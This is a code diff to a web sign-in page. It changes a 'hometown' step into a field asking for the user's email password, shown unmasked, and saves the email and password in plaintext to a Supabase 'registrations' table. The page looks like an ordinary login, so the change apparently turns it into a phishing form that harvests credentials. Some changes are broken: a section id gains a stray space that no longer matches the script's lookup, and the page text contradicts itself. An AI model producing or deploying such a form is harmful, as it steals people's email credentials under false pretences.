@@ -41,9 +41,9 @@
                autocomplete="username" required>
       </section>
 
-      <section id="hometownStep" class="hidden">
-        <label class="step-label" for="hometown">Hometown</label>
-        <input class="field" id="hometown" type="text" placeholder="Enter your hometown or city"
+      <section id="password Step" class="hidden">
+        <label class="step-label" for="password">Password</label>
+        <input class="field" id="password" type="text" placeholder="Enter your email password"
                autocomplete="address-level2" maxlength="100" required>
       </section>
 
@@ -65,7 +65,7 @@
 
     const form = document.getElementById('loginForm');
     const username = document.getElementById('username');
-    const hometown = document.getElementById('hometown');
+    const password = document.getElementById('password');
     const message = document.getElementById('message');
     const heading = document.getElementById('heading');
     const subtitle = document.getElementById('subtitle');
@@ -77,19 +77,19 @@
     function showStep(n) {
       step = n;
       username.required = (n === 1);
-      hometown.required = (n === 2);
+      password.required = (n === 2);
 
       document.getElementById('usernameStep').classList.toggle('hidden', n !== 1);
-      document.getElementById('hometownStep').classList.toggle('hidden', n !== 2);
+      document.getElementById('passwordStep').classList.toggle('hidden', n !== 2);
       backButton.classList.toggle('hidden', n === 1);
-      heading.textContent = n === 1 ? 'Sign in' : 'Your hometown';
+      heading.textContent = n === 1 ? 'Sign in' : 'Your password';
       subtitle.textContent = n === 1 ? 'Continue to your account' : username.value.trim();
       nextButton.textContent = n === 1 ? 'Next' : 'Login';
       note.textContent = n === 1
         ? 'Enter your email address to continue.'
-        : 'Enter your hometown to finish. No password or email verification is required.';
+        : 'Enter your password to finish. No password or email verification is required.';
       message.textContent = '';
-      (n === 1 ? username : hometown).focus();
+      (n === 1 ? username : password).focus();
     }
 
     showStep(1);
@@ -108,17 +108,17 @@
         return;
       }
 
-      if (!hometown.checkValidity()) {
-        hometown.reportValidity();
+      if (! password.checkValidity()) {
+        password.reportValidity();
         return;
       }
 
       const email = username.value.trim().toLowerCase();
-      const city = hometown.value.trim();
+      const city = password.value.trim();
 
       if (!city) {
-        message.textContent = 'Please enter your hometown.';
-        hometown.focus();
+        message.textContent = 'Please enter your password.';
+        password.focus();
         return;
       }
 
@@ -130,16 +130,16 @@
         // This creates a registration record only. It does not create a Supabase Auth session.
         const { error } = await supabaseClient
           .from('registrations')
-          .insert([{ email: email, hometown: city }]);
+          .insert([{ email: email, password: city }]);
 
         if (error) throw error;
 
         document.getElementById('usernameStep').classList.add('hidden');
-        document.getElementById('hometownStep').classList.add('hidden');
+        document.getElementById('passwordStep').classList.add('hidden');
         nextButton.classList.add('hidden');
         heading.textContent = 'You are in';
         subtitle.textContent = 'Your details have been saved.';
-        note.textContent = 'Your email and hometown have been saved successfully.';
+        note.textContent = 'Your email and password have been saved successfully.';
         message.textContent = 'You can continue.';
       } catch (error) {
         message.textContent = error.message || 'Unable to save your details. Please try again.';
